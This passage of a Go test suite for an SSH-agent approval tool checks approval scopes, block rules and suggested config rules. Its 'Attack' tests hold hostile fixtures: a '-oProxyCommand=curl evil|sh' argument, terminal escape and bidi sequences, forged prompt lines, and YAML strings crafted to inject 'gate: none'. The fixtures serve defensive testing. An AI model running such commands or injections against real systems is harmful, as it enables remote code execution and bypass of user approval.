	waitFor(t, "late approval was not released", func() bool { return e.f.LiveApprovals() == 0 })
	if len(e.cache.List()) != 0 {
		t.Fatal("a late answer must never be remembered")
	}
	if r := e.b.Handle(e.req("github", tab.Peer())); r.Decision == audit.Allowed {
		t.Fatalf("a late answer must not approve later requests: %+v", r)
	}
}

// Spec 4.4: the timeout is defaults.timeout (60 s when unset) and is passed to
// the platform with the prompt.
func TestTimeoutComesFromConfig(t *testing.T) {
	e := newEnvWith(t, moreCfg, 0)
	if got := e.b.GateTimeout(); got != 30*time.Second {
		t.Fatalf("GateTimeout %v, want defaults.timeout 30s", got)
	}
	e.f.SetDefaults(fake.Answer{Allow: true}, fake.Answer{})
	tab := e.f.ITermTab(platform.ProcessRef{}, fake.SSHProc("h"))
	e.b.Handle(e.req("userkey", tab.Peer()))
	if p := e.f.Shown()[0].Prompt; p.Timeout != 30*time.Second {
		t.Fatalf("prompt timeout %v", p.Timeout)
	}
	if d := newEnvWith(t, cfgSrc, 0).b.GateTimeout(); d != 60*time.Second {
		t.Fatalf("default timeout %v, want 60s", d)
	}
	e.reload(t, strings.Replace(moreCfg, "timeout: 30s", "timeout: 5s", 1))
	if got := e.b.GateTimeout(); got != 5*time.Second {
		t.Fatalf("GateTimeout after reload %v, want 5s", got)
	}
}

// Spec 4.2: scope app covers every request from the same app until it quits.
func TestAppScope(t *testing.T) {
	e := newEnvWith(t, moreCfg, 200*time.Millisecond)
	e.f.SetDefaults(fake.Answer{}, fake.Answer{Allow: true})
	a := e.f.ITermTab(platform.ProcessRef{}, fake.SSHProc("h"))
	b := e.f.ITermTab(a.App, fake.SSHProc("h"))
	if r := e.b.Handle(e.req("appkey", a.Peer())); r.Decision != audit.Approved {
		t.Fatalf("%+v", r)
	}
	if r := e.b.Handle(e.req("appkey", b.Peer())); r.Decision != audit.Allowed {
		t.Fatalf("another tab of the same app: %+v", r)
	}
	e.f.Exit(b.Shell)
	if len(e.cache.List()) != 1 {
		t.Fatal("closing a tab must not end an app-scoped approval")
	}
	e.f.Exit(a.App)
	if len(e.cache.List()) != 0 {
		t.Fatal("quitting the app must end its approvals")
	}
	c := e.f.ITermTab(platform.ProcessRef{}, fake.SSHProc("h"))
	if r := e.b.Handle(e.req("appkey", c.Peer())); r.Decision != audit.Approved {
		t.Fatalf("relaunched app must ask again: %+v", r)
	}
	if e.f.CountShown(fake.KindConfirm) != 2 {
		t.Fatal("want two dialogs")
	}
}

// Closing one tab ends only that tab's approvals.
func TestSessionExitIsPerTab(t *testing.T) {
	e := newEnv(t)
	e.f.SetDefaults(fake.Answer{Allow: true}, fake.Answer{Allow: true})
	a := e.f.ITermTab(platform.ProcessRef{}, fake.SSHProc("h"))
	b := e.f.ITermTab(a.App, fake.SSHProc("h"))
	e.b.Handle(e.req("github", a.Peer()))
	e.b.Handle(e.req("github", b.Peer()))
	if len(e.cache.List()) != 2 {
		t.Fatal("want one approval per tab")
	}
	e.f.Exit(a.Shell)
	if l := e.cache.List(); len(l) != 1 || e.f.LiveApprovals() != 1 {
		t.Fatalf("closing tab a must leave tab b's approval: %+v", l)
	}
	if r := e.b.Handle(e.req("github", e.f.Launch(b.Shell, fake.SSHProc("h")))); r.Decision != audit.Allowed {
		t.Fatalf("%+v", r)
	}
}

// Repeated cached requests must not pile up exit watchers, and a scope
// re-approved after `nazar revoke` must still end when the tab closes.
func TestExitWatchAfterRevoke(t *testing.T) {
	e := newEnv(t)
	e.f.SetDefaults(fake.Answer{Allow: true}, fake.Answer{Allow: true})
	tab := e.f.ITermTab(platform.ProcessRef{}, fake.SSHProc("h"))
	e.b.Handle(e.req("github", tab.Peer()))
	w := e.f.ExitWatchers(tab.Shell)
	if w == 0 {
		t.Fatal("a session approval must watch the session root")
	}
	for i := 0; i < 10; i++ {
		e.b.Handle(e.req("github", e.f.Launch(tab.Shell, fake.SSHProc("h"))))
	}
	if got := e.f.ExitWatchers(tab.Shell); got != w {
		t.Fatalf("exit watchers grew from %d to %d", w, got)
	}
	e.cache.RevokeAll("revoked")
	if r := e.b.Handle(e.req("github", tab.Peer())); r.Decision != audit.Approved {
		t.Fatalf("after revoke the next request asks again: %+v", r)
	}
	e.f.Exit(tab.Shell)
	if len(e.cache.List()) != 0 || e.f.LiveApprovals() != 0 {
		t.Fatal("the re-approved session approval must end with the tab")
	}
}

// A tab closed while its prompt is open must not leave a remembered approval
// behind.
func TestSessionEndsDuringPrompt(t *testing.T) {
	e := newEnv(t)
	tab := e.f.ITermTab(platform.ProcessRef{}, fake.SSHProc("h"))
	e.f.SetGateFuncs(func(platform.Prompt) fake.Answer {
		e.f.Exit(tab.Shell)
		return fake.Answer{Allow: true}
	}, nil)
	e.b.Handle(e.req("github", tab.Peer()))
	waitFor(t, "an approval for a session that already ended was kept", func() bool {
		return len(e.cache.List()) == 0 && e.f.LiveApprovals() == 0
	})
}

// Spec 4.3: approvals are keyed by receiver too: approving one program in a
// tab doesn't cover a different program in that tab.
func TestApprovalsArePerReceiver(t *testing.T) {
	e := newEnvWith(t, moreCfg, 200*time.Millisecond)
	e.f.SetDefaults(fake.Answer{}, fake.Answer{Allow: true})
	tab := e.f.ITermTab(platform.ProcessRef{})
	ssh := e.f.Launch(tab.Shell, fake.SSHProc("h"))
	sftp := e.f.Launch(tab.Shell, fake.Proc{Path: "/usr/bin/sftp", Args: []string{"sftp", "h"}, Code: fake.AppleCode("com.apple.sftp")})
	if r := e.b.Handle(e.req("recv", ssh)); r.Decision != audit.Approved {
		t.Fatalf("%+v", r)
	}
	if r := e.b.Handle(e.req("recv", sftp)); r.Decision != audit.Approved {
		t.Fatalf("a different receiver must ask again: %+v", r)
	}
	if r := e.b.Handle(e.req("recv", e.f.Launch(tab.Shell, fake.SSHProc("h")))); r.Decision != audit.Allowed {
		t.Fatalf("same receiver, same tab: %+v", r)
	}
	if e.f.CountShown(fake.KindConfirm) != 2 {
		t.Fatal("want two dialogs")
	}
}

// Approvals are per rule (by rule id): after a config change that edits
// the rule, the old approval no longer covers requests.
func TestReloadedRuleDoesNotInheritApproval(t *testing.T) {
	e := newEnv(t)
	e.f.SetDefaults(fake.Answer{Allow: true}, fake.Answer{Allow: true})
	tab := e.f.ITermTab(platform.ProcessRef{}, fake.SSHProc("h"))
	e.b.Handle(e.req("github", tab.Peer()))
	e.reload(t, strings.Replace(cfgSrc, "expire: 8h", "expire: 4h", 1))
	if r := e.b.Handle(e.req("github", tab.Peer())); r.Decision != audit.Approved {
		t.Fatalf("an edited rule must not reuse the old rule's approval: %+v", r)
	}
	if e.f.CountShown(fake.KindAuthenticate) != 2 {
		t.Fatal("want a new login prompt")
	}
}

// A reload that blocks a caller wins over a remembered approval.
func TestReloadToBlockWinsOverCache(t *testing.T) {
	e := newEnv(t)
	e.f.SetDefaults(fake.Answer{Allow: true}, fake.Answer{Allow: true})
	tab := e.f.ITermTab(platform.ProcessRef{}, fake.SSHProc("h"))
	e.b.Handle(e.req("github", tab.Peer()))
	e.reload(t, strings.Replace(cfgSrc, "          scope: session\n          gate: login\n          expire: 8h\n", "          gate: block\n", 1))
	if r := e.b.Handle(e.req("github", tab.Peer())); r.Decision != audit.Blocked || e.calls.Load() != 1 {
		t.Fatalf("a blocking rule must win over a remembered approval: %+v", r)
	}
}

// An explicit gate: block rule refuses at once with a warning, before any
// later rule that would prompt.
func TestExplicitBlockRule(t *testing.T) {
	e := newEnvWith(t, moreCfg, 200*time.Millisecond)
	e.f.SetDefaults(fake.Answer{Allow: true}, fake.Answer{Allow: true})
	tab := e.f.ITermTab(platform.ProcessRef{}, fake.ClaudeProc(), fake.SSHProc("h"))
	r := e.b.Handle(e.req("guarded", tab.Peer()))
	if r.Decision != audit.Blocked || r.Allowed() || r.Outcome.RuleIndex != 1 {
		t.Fatalf("%+v", r)
	}
	if len(e.f.Shown()) != 0 || e.calls.Load() != 0 || len(e.f.Warnings()) != 1 {
		t.Fatal("a block rule refuses without a prompt and shows a warning")
	}
	if !strings.HasPrefix(e.f.Warnings()[0].Title, "Blocked") {
		t.Fatalf("warning title %q", e.f.Warnings()[0].Title)
	}
	if f := e.lastLine(t); f["decision"] != "blocked" || f["rule"] != "1" || f["gate"] != "block" {
		t.Fatalf("audit %v", f)
	}
}

// Spec 4.4: dedup is per caller and target; within the window the warning is
// updated, a different caller or key gets its own window.
func TestBlockWarningDedupKeys(t *testing.T) {
	e := newEnv(t)
	term := e.f.Launch(platform.ProcessRef{}, fake.Proc{Path: "/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal", Code: fake.AppleCode("com.apple.Terminal"), App: &fake.App{BundleID: "com.apple.Terminal", Name: "Terminal"}})
	ghostty := e.f.Launch(platform.ProcessRef{}, fake.Proc{Path: "/Applications/Ghostty.app/Contents/MacOS/ghostty", Code: platform.CodeIdentity{Signed: true, TeamID: "24VZTF6M5V", SigningID: "com.mitchellh.ghostty", CDHash: []byte{9}}, App: &fake.App{BundleID: "com.mitchellh.ghostty", Name: "Ghostty"}})
	e.b.Handle(e.req("github", e.f.Launch(term, fake.SSHProc("h"))))
	e.f.Advance(9*time.Minute + 59*time.Second)
	e.b.Handle(e.req("github", e.f.Launch(term, fake.SSHProc("h"))))
	e.b.Handle(e.req("github", e.f.Launch(ghostty, fake.SSHProc("h"))))
	e.b.Handle(e.req("other", e.f.Launch(term, fake.SSHProc("h"))))
	w := e.f.Warnings()
	if len(w) != 4 {
		t.Fatalf("warnings %+v", w)
	}
	if w[1].ID != w[0].ID || w[1].Count != 2 {
		t.Fatalf("same caller and key within 10 min must update one window: %+v", w[:2])
	}
	if w[2].ID == w[0].ID || w[2].Count != 1 {
		t.Fatalf("a different caller gets its own warning: %+v", w[2])
	}
	if w[3].ID == w[0].ID || w[3].ID == w[2].ID || w[3].Count != 1 {
		t.Fatalf("a different key gets its own warning: %+v", w[3])
	}
	if n := len(e.sink.Lines()); n != 4 {
		t.Fatalf("every blocked attempt is still logged: %d lines", n)
	}
}

// Attack: caller-controlled text (app name, argv, cwd, the request summary)
// must not inject lines, escape sequences or bidi overrides into a prompt.
func TestPromptSanitizesCallerText(t *testing.T) {
	e := newEnvWith(t, moreCfg, 200*time.Millisecond)
	e.f.SetDefaults(fake.Answer{Allow: true}, fake.Answer{})
	evil := e.f.Launch(platform.ProcessRef{}, fake.Proc{
		Path: "/Applications/Evil.app/Contents/MacOS/Evil", Code: platform.CodeIdentity{Signed: true, TeamID: "EVILTEAM01", SigningID: "com.evil.app", CDHash: []byte{1}},
		App: &fake.App{BundleID: "com.evil.app", Name: "iTerm2\nScope: this request only\x1b[2J\u202e"},
	})
	peer := e.f.Launch(evil, fake.Proc{
		Path: "/usr/bin/ssh", Args: []string{"ssh\r\nchain: iTerm2", "--token=ghp_secretsecret1", "\x1b]52;c;cHduZWQ=\x07"},
		Cwd: "/Users/u/x\nchain: iTerm2 → bash → ssh\u202e", Code: fake.AppleCode("com.apple.openssh"),
	})
	req := e.req("userkey", peer)
	req.Summary = "login to github.com as git\r\nScope: this terminal session\x1b[0m"
	if r := e.b.Handle(req); r.Decision != audit.Approved {
		t.Fatalf("%+v", r)
	}
	p := e.f.Shown()[0].Prompt
	noControl(t, "title", p.Title)
	noControl(t, "reason", p.Reason)
	for i, l := range p.Lines {
		noControl(t, fmt.Sprintf("line %d", i), l)
	}
	if text := promptText(p); strings.Contains(text, "secretsecret") {
		t.Fatalf("prompt leaks a token:\n%s", text)
	}
	// A caller cannot forge the approval line: exactly one line starts with
	// "Scope:" and it says what nazar decided.
	n := 0
	for _, l := range p.Lines {
		if strings.HasPrefix(strings.TrimSpace(l), "Scope:") {
			n++
			if !strings.Contains(l, "this request only") {
				t.Errorf("approval line %q", l)
			}
		}
	}
	if n != 1 {
		t.Fatalf("%d Scope lines in %q", n, p.Lines)
	}
}

// Attack: the block warning shows the same caller-controlled text.
func TestWarningSanitizesCallerText(t *testing.T) {
	e := newEnv(t)
	evil := e.f.Launch(platform.ProcessRef{}, fake.Proc{
		Path: "/Applications/Evil.app/Contents/MacOS/Evil", Code: platform.CodeIdentity{Signed: true, TeamID: "EVILTEAM01", SigningID: "com.evil.app", CDHash: []byte{1}},
		App: &fake.App{BundleID: "com.evil.app", Name: "Evil\nTo allow it, click OK\x1b[2J"},
	})
	peer := e.f.Launch(evil, fake.Proc{Path: "/usr/bin/ssh", Args: []string{"ssh", "-oProxyCommand=curl evil|sh", "\x1b[31mred"}, Cwd: "/tmp/\u202e/x\ny", Code: fake.AppleCode("com.apple.openssh")})
	req := e.req("github", peer)
	req.Summary = "login to github.com\nAllowed."
	if r := e.b.Handle(req); r.Decision != audit.Blocked {
		t.Fatalf("%+v", r)
	}
	w := e.f.Warnings()[0]
	noControl(t, "warning title", w.Title)
	for i, l := range w.Lines {
		noControl(t, fmt.Sprintf("warning line %d", i), l)
	}
	if strings.Contains(strings.Join(w.Lines, "\n"), "curl evil") {
		t.Fatalf("warning shows an unredacted argument: %q", w.Lines)
	}
}

// bare reports whether sub occurs in s outside a Go-quoted span, i.e. where
// it reads as part of the command rather than as a quoted program name.
func bare(s, sub string) bool {
	inQuote := make([]bool, len(s))
	q := false
	for i := 0; i < len(s); i++ {
		switch {
		case q && s[i] == '\\':
			inQuote[i] = true
			i++
			if i < len(s) {
				inQuote[i] = true
			}
			continue
		case s[i] == '"':
			q = !q
		}
		inQuote[i] = q
	}
	for i := 0; ; {
		j := strings.Index(s[i:], sub)
		if j < 0 {
			return false
		}
		j += i
		if !inQuote[j] {
			return true
		}
		i = j + 1
	}
}

// Attack (spec 4.6): argv[0] is caller chosen and
// RedactArgs keeps its base name as is. A prompt or block warning must render
// it the way the audit log does, quoted unless it is a plain word, so that a
// program named "git push origin main" or "ssh git@github.com" cannot read as
// that command, and a blank-looking rune cannot make "ssh⠀git@github.com"
// look like the real `ssh git@github.com`. The real `ssh git@github.com`
// shows as `ssh …`, so without quoting a forger would look more trustworthy
// than the real thing.
func TestPromptAndWarningQuoteProgramName(t *testing.T) {
	long := strings.Repeat("a", 300)
	cases := []struct {
		argv       []string
		wantQuoted string // must appear in the command line
		notBare    string // must not appear outside quotes
		noRune     rune   // must not appear raw at all
		audit      string // must appear in the audit receiver (the same rendering)
	}{
		{argv: []string{"git push origin main", "-v"}, wantQuoted: `"git push origin main" -v`, notBare: "git push origin main", audit: `"git push origin main" -v`},
		{argv: []string{"ssh git@github.com"}, wantQuoted: `"ssh git@github.com"`, notBare: "ssh git@github.com", audit: `"ssh git@github.com"`},
		{argv: []string{"ssh\u2800git@github.com"}, wantQuoted: `"ssh\u2800git@github.com"`, notBare: "ssh\u2800git@github.com", noRune: 0x2800, audit: `"ssh\u2800git@github.com"`},
		{argv: []string{"ssh git@github.com    in ~trusted" + strings.Repeat(" ", 80)}, wantQuoted: `"ssh git@github.com    in ~trusted`, notBare: "in ~trusted", audit: `"ssh git@github.com    in ~trusted`},
		{argv: []string{"ssh:", "-v"}, wantQuoted: `"ssh:" -v`, notBare: "ssh:", audit: `"ssh:" -v`},
		{argv: []string{long + " x", "-v"}, wantQuoted: `-v    in ~/projects/foo`, notBare: long},
		{argv: []string{"ssh", "git@github.com"}, wantQuoted: "ssh …", notBare: "git@github.com", audit: "ssh …"},
	}
	for _, tc := range cases {
		e := newEnv(t)
		e.f.SetDefaults(fake.Answer{Allow: true}, fake.Answer{})
		tab := e.f.ITermTab(platform.ProcessRef{}, fake.Proc{Path: "/tmp/x/" + tc.argv[0], Args: tc.argv, Cwd: "/Users/u/projects/foo", Code: fake.Unsigned})
		if r := e.b.Handle(e.req("github", tab.Peer())); r.Decision != audit.Approved {
			t.Fatalf("%v: %+v", tc.argv, r)
		}
		if r := e.b.Handle(e.req("other", tab.Peer())); r.Decision != audit.Blocked {
			t.Fatalf("%v: %+v", tc.argv, r)
		}
		p := e.f.Shown()[0].Prompt
		w := e.f.Warnings()[0]
		for _, shown := range []struct {
			what  string
			lines []string
			cmd   string // the command line of the dialog (spec 4.4: summary, command, chain, approval)
		}{{"prompt", append([]string{p.Title, p.Reason}, p.Lines...), p.Lines[1]}, {"warning", append([]string{w.Title}, w.Lines...), w.Lines[1]}} {
			text := strings.Join(shown.lines, "\n")
			if !strings.Contains(text, tc.wantQuoted) {
				t.Errorf("%v: %s lacks %q:\n%s", tc.argv, shown.what, tc.wantQuoted, text)
			}
			for i, l := range shown.lines {
				noControl(t, fmt.Sprintf("%s line %d", shown.what, i), l)
				if bare(l, tc.notBare) {
					t.Errorf("%v: %s line %d shows the program bare: %q", tc.argv, shown.what, i, l)
				}
			}
			if tc.noRune != 0 && strings.ContainsRune(shown.cmd, tc.noRune) {
				t.Errorf("%v: %s command line shows U+%04X raw: %q", tc.argv, shown.what, tc.noRune, shown.cmd)
			}
			if !strings.Contains(shown.cmd, tc.wantQuoted) {
				t.Errorf("%v: %s command line %q lacks %q", tc.argv, shown.what, shown.cmd, tc.wantQuoted)
			}
			// The folder is nazar's own text and always follows the command.
			if !strings.Contains(text, "    in ~/projects/foo") {
				t.Errorf("%v: %s lost the folder:\n%s", tc.argv, shown.what, text)
			}
		}
		// The audit line renders the program the same way.
		if f := e.lastLine(t); tc.audit != "" && !strings.Contains(f["receiver"], tc.audit) {
			t.Errorf("%v: audit receiver %q lacks %q", tc.argv, f["receiver"], tc.audit)
		}
	}
}

// programText is bare only for a plain word and never longer than maxName
// runes, whatever argv[0] is.
func TestProgramText(t *testing.T) {
	for in, want := range map[string]string{
		"ssh": "ssh", "git-lfs": "git-lfs", "python3.12": "python3.12", "--": "--",
		"ssh ": `"ssh "`, "ssh:": `"ssh:"`, "a=b": `"a=b"`, "ssh\n": `"ssh\n"`, "ѕѕh": `"\u0455\u0455h"`,
		"…": `"\u2026"`, strings.Repeat("x", 33): `"` + strings.Repeat("x", 33) + `"`,
	} {
		if got := programText(in); got != want {
			t.Errorf("programText(%q) = %q, want %q", in, got, want)
		}
	}
	for _, in := range []string{strings.Repeat("x", 500), strings.Repeat("\U0001F600", 100), strings.Repeat("\x00", 100), strings.Repeat("x", 63) + "\U0001F600"} {
		got := programText(in)
		if n := len([]rune(got)); n > maxName {
			t.Errorf("programText(%.10q…) is %d runes, max %d: %q", in, n, maxName, got)
		}
		if !strings.HasPrefix(got, `"`) || !strings.HasSuffix(got, "…") {
			t.Errorf("programText(%.10q…) = %q: a cut program is quoted and ends with an ellipsis", in, got)
		}
	}
}

// Spec 4.4 / 9: the login gate's reason names the app, the key and the
// destination; an unknown chain's dialog leads with the Unknown app header
// and offers a one-time approval only.
func TestPromptReasonAndUnknownHeader(t *testing.T) {
	e := newEnv(t)
	e.f.SetDefaults(fake.Answer{Allow: true}, fake.Answer{Allow: true})
	tab := e.f.ITermTab(platform.ProcessRef{}, fake.SSHProc("h"))
	e.b.Handle(e.req("github", tab.Peer()))
	p := e.f.Shown()[0].Prompt
	for _, want := range []string{"github", "iTerm2", "github.com"} {
		if !strings.Contains(p.Reason, want) {
			t.Errorf("reason %q lacks %q", p.Reason, want)
		}
	}
	mux := e.f.Launch(platform.ProcessRef{}, fake.SSHProc("[mux]"))
	e.b.Handle(e.req("unk", mux))
	u := e.f.Shown()[1].Prompt
	if !u.Unknown || !strings.Contains(promptText(u), "Unknown app") || !strings.Contains(promptText(u), "this request only") {
		t.Fatalf("unknown prompt %+v", u)
	}
	if f := e.lastLine(t); f["scope"] != "use" {
		t.Fatalf("an unknown chain's approval is one-time, audit scope %q", f["scope"])
	}
}

// Forwarded agents: a login approval for a forwarded request is one-shot and
// released; it never fills the cache for the local tab either.
func TestForwardedLoginIsOneShot(t *testing.T) {
	e := newEnv(t)
	e.f.SetDefaults(fake.Answer{Allow: true}, fake.Answer{})
	tab := e.f.ITermTab(platform.ProcessRef{}, fake.SSHProc("h"))
	fwd := e.req("github", tab.Peer())
	fwd.Forwarded = true
	var ref platform.ApprovalRef
	fwd.Do = func(r platform.ApprovalRef) error { ref = r; return nil }
	if r := e.b.Handle(fwd); r.Decision != audit.Approved || ref == 0 {
		t.Fatalf("%+v ref %v", r, ref)
	}
	if len(e.cache.List()) != 0 || e.f.LiveApprovals() != 0 {
		t.Fatal("a forwarded approval must not be remembered or kept")
	}
	if f := e.lastLine(t); f["scope"] != "use" {
		t.Fatalf("forwarded audit scope %q, want use", f["scope"])
	}
	if r := e.b.Handle(e.req("github", tab.Peer())); r.Decision != audit.Approved {
		t.Fatalf("a local request after a forwarded one asks for itself: %+v", r)
	}
	if e.f.CountShown(fake.KindAuthenticate) != 2 {
		t.Fatal("want two login prompts")
	}
}

// (Forwarded requests under gate none: see TestForwardedGateNoneGetsOneTimeDialog
// in fail_closed_test.go. Spec 5 gives them a dialog; they never stay silent.)

// A forwarded request from a blocked caller is still blocked.
func TestForwardedBlockedStaysBlocked(t *testing.T) {
	e := newEnv(t)
	e.f.SetDefaults(fake.Answer{Allow: true}, fake.Answer{Allow: true})
	stray := e.f.Launch(platform.ProcessRef{}, fake.Proc{Path: "/tmp/stray", Code: fake.Unsigned})
	req := e.req("github", stray)
	req.Forwarded = true
	if r := e.b.Handle(req); r.Decision != audit.Blocked || len(e.f.Shown()) != 0 || e.calls.Load() != 0 {
		t.Fatalf("%+v", r)
	}
}

func TestLoginTimeoutAndErrors(t *testing.T) {
	e := newEnv(t)
	release := make(chan struct{})
	e.f.ScriptAuth(fake.Answer{Allow: true, Wait: release}, fake.Answer{Err: errors.New("biometry lockout")})
	if d, _ := e.b.Login(platform.Prompt{Title: "Apply config?"}); d != audit.Timeout {
		t.Fatalf("got %v, want timeout", d)
	}
	close(release)
	waitFor(t, "late control approval not released", func() bool { return e.f.LiveApprovals() == 0 && len(e.f.Released()) == 1 })
	if d, r := e.b.Login(platform.Prompt{Title: "x", Timeout: 150 * time.Millisecond}); d != audit.Error || !strings.Contains(r, "biometry lockout") {
		t.Fatalf("got %v %q", d, r)
	}
	if got := e.f.Shown()[1].Prompt.Timeout; got != 150*time.Millisecond {
		t.Fatalf("an explicit Login timeout must be kept, got %v", got)
	}
}

// parseSuggestion decodes a suggested rule the way the config file would.
func parseSuggestion(t *testing.T, s string) map[string]any {
	t.Helper()
	var rules []map[string]any
	if err := yaml.Unmarshal([]byte(s), &rules); err != nil {
		t.Fatalf("suggested rule is not valid YAML: %v\n%s", err, s)
	}
	if len(rules) != 1 {
		t.Fatalf("suggestion must be exactly one rule, got %d:\n%s", len(rules), s)
	}
	r := rules[0]
	// apps: is a list (the only shape config.yaml takes) of one matcher;
	// the callers look at that matcher.
	apps, ok := r["apps"].([]any)
	if !ok || len(apps) != 1 {
		t.Fatalf("a suggestion's apps: must be a list of one matcher:\n%s", s)
	}
	r["apps"] = apps[0]
	if g, _ := r["gate"].(string); g == "none" || g == "" {
		t.Fatalf("a suggestion must keep a person in the loop, gate %q:\n%s", g, s)
	}
	if a, _ := r["apps"].(string); a == "any" {
		t.Fatalf("a suggestion must never be apps: any:\n%s", s)
	}
	return r
}

// Spec 4.4: "Copy suggested rule" uses the right signed:/app:/path: matcher for
// this caller and is a valid rule.
func TestSuggestRule(t *testing.T) {
	e := newEnv(t)
	claude := e.f.ITermTab(platform.ProcessRef{}, fake.ClaudeProc(), fake.SSHProc("h"))
	r := parseSuggestion(t, SuggestRule(e.r.Resolve(claude.Peer())))
	signed, _ := r["apps"].(map[string]any)["signed"].(map[string]any)
	if signed["team"] != "Q6L2SF6YDW" || signed["id"] != "com.anthropic.claude-code" {
		t.Fatalf("claude suggestion %v", r)
	}
	term := e.f.Launch(platform.ProcessRef{}, fake.Proc{Path: "/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal", Code: fake.AppleCode("com.apple.Terminal"), App: &fake.App{BundleID: "com.apple.Terminal", Name: "Terminal"}})
	py := e.f.Launch(term, fake.Proc{Path: "/usr/bin/python3", Code: fake.AppleCode("com.apple.python3")})
	s := SuggestRule(e.r.Resolve(e.f.Launch(py, fake.SSHProc("h"))))
	r = parseSuggestion(t, s)
	if app, _ := r["apps"].(map[string]any)["app"].(string); app != "com.apple.Terminal" {
		t.Fatalf("Terminal suggestion %v", r)
	}
	if strings.Contains(s, "team: apple") || strings.Contains(s, "python3") {
		t.Fatalf("never suggest an Apple-signed process matcher (it matches nearly every chain):\n%s", s)
	}
	// Every suggestion pasted into a key's rules must be a valid config.
	for _, sug := range []string{SuggestRule(e.r.Resolve(claude.Peer())), s} {
		var b strings.Builder
		b.WriteString("apiVersion: nazar/v1\nkind: Config\nssh_agent:\n  keys:\n    k:\n      rules:\n")
		for _, l := range strings.Split(sug, "\n") {
			b.WriteString("        " + l + "\n")
		}
		if _, probs := config.Parse([]byte(b.String()), config.Env{Home: "/Users/u"}); probs.HasErrors() {
			t.Fatalf("suggestion does not parse as a rule: %v\n%s", probs.Error(), b.String())
		}
	}
}

// crafted values a malicious binary can choose for the identity a suggested
// rule is built from: each tries to end the matcher and add a gate: none
// rule, a second rule or apps: any, or to read back as something other than
// a string.
var craftedIDs = []string{
	"com.evil}}\n  scope: app\n  gate: none\n- apps: {app: x",
	"com.evil\n  scope: app\n  gate: none\n- apps: [{app: x}]",
	"com.evil}   # \n  gate: none",
	"com.evil, gate: none}",
	"com.evil\r\n- apps: [any]",
	"com.evil\", gate: none, x: \"",
	"com.evil', gate: none, x: '",
	"com.evil #}\n  gate: none",
	"yes", "no", "null", "true", "False", "on", "~", "", "0x10", "1e3", "123", "1.5", "0o17", "0b101", "1_000", "2026-10-04", ".inf", ".NaN", "- apps: [any]", "{}", "[]", "!!str x", "&a x", "*a", "|\n  gate: none", "> gate: none", "%YAML",
	"com.evil\u2028  gate: none", "com.evil\u0085  gate: none", "com.evil\u202e", "com.evil\x00",
}

// Attack (spec 4.4): "Copy suggested rule"
// builds the matcher from a signing ID or a bundle ID,
// all chosen by whoever signs, bundles or names a malicious binary, and the
// user pastes the text into config.yaml. A crafted value must stay inside
// one scalar of one rule: it can never end the matcher, add gate: none (which
// config validation accepts under a non-Apple signed: or app: matcher), add
// a second rule or apps: any, or read back as a bool, null or number. Every
// case reaches the branch it targets: the parsed matcher value must equal
// the crafted string exactly.
func TestSuggestRuleInjection(t *testing.T) {
	e := newEnv(t)
	check := func(t *testing.T, s, matcher, want string) {
		t.Helper()
		r := parseSuggestion(t, s)
		if len(r) != 3 {
			t.Fatalf("suggestion carries extra keys %v:\n%s", r, s)
		}
		if r["scope"] != "session" || r["gate"] != "login" {
			t.Fatalf("suggestion scope %v gate %v, want session/login:\n%s", r["scope"], r["gate"], s)
		}
		apps, _ := r["apps"].(map[string]any)
		var got any
		if matcher == "id" {
			signed, _ := apps["signed"].(map[string]any)
			got = signed["id"]
			if signed["team"] != "EVILTEAM01" {
				t.Fatalf("team %v:\n%s", signed["team"], s)
			}
		} else {
			got = apps[matcher]
		}
		if v, ok := got.(string); !ok || v != want {
			t.Fatalf("%s: matcher reads back as %T %q, want the exact string %q:\n%s", matcher, got, got, want, s)
		}
	}
	for _, id := range craftedIDs {
		// A known app (iTerm2) with a non-Apple signed program whose signing
		// ID is crafted: the signed: branch.
		if id != "" {
			tab := e.f.ITermTab(platform.ProcessRef{}, fake.Proc{
				Path: "/tmp/evil", Code: platform.CodeIdentity{Signed: true, TeamID: "EVILTEAM01", SigningID: id, CDHash: []byte{1}},
			}, fake.SSHProc("h"))
			check(t, SuggestRule(e.r.Resolve(tab.Peer())), "id", id)
		}
		// A GUI app with a crafted bundle ID above a shell and ssh: the app:
		// branch. (An empty bundle ID falls through to apps: unknown below.)
		if id != "" {
			app := e.f.Launch(platform.ProcessRef{}, fake.Proc{Path: "/Applications/Evil.app/Contents/MacOS/Evil", Code: fake.Unsigned, App: &fake.App{BundleID: id, Name: "Evil"}})
			sh := e.f.Launch(app, fake.Proc{Path: "/bin/zsh", Code: fake.AppleCode("com.apple.zsh")})
			check(t, SuggestRule(e.r.Resolve(e.f.Launch(sh, fake.SSHProc("h")))), "app", id)
		}
	}
	// A bare executable below an app with no bundle id gets the one-shot
	// apps: unknown, never a path: rule (that is for a program with no app
	// above it), whatever its path, crafted or not.
	for _, id := range craftedIDs {
		for _, path := range []string{"/tmp/" + id, "/opt/homebrew/bin/kubectl", "x", "/tmp/../x"} {
			app := e.f.Launch(platform.ProcessRef{}, fake.Proc{Path: "/Applications/Bare.app/Contents/MacOS/Bare", Code: fake.Unsigned, App: &fake.App{}})
			s := SuggestRule(e.r.Resolve(e.f.Launch(app, fake.Proc{Path: path, Code: fake.Unsigned})))
			if r := parseSuggestion(t, s); r["apps"] != "unknown" || r["scope"] != "use" || strings.Contains(s, "path") {
				t.Fatalf("path %q must get the one-shot unknown suggestion:\n%s", path, s)
			}
		}
	}
}

// An unsigned program with no app above it (a Homebrew daemon launchd
// started) gets a one-shot path: rule for its file, by its stable opt/
// link when it runs from a Cellar and the link resolves to it now.
// Interpreters (a path: rule would cover every script), team-signed and
// Apple programs keep the apps: unknown suggestion.
func TestSuggestRulePath(t *testing.T) {
	e := newEnv(t)
	d, err := filepath.EvalSymlinks(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	cellar := filepath.Join(d, "Cellar/mytool/1.2/bin/mytool")
	if err := os.MkdirAll(filepath.Dir(cellar), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(cellar, nil, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(d, "opt"), 0o755); err != nil {
		t.Fatal(err)
	}
	opt := filepath.Join(d, "opt/mytool/bin/mytool")
	adhoc := platform.CodeIdentity{Signed: true, AdHoc: true, SigningID: "a.out", CDHash: []byte{1}}
	suggest := func(path string, code platform.CodeIdentity) string {
		return SuggestRule(e.r.Resolve(e.f.Launch(e.f.Launch(platform.ProcessRef{}, fake.Proc{Path: path, Code: code}), fake.SSHProc("h"))))
	}
	pathOf := func(s string) any {
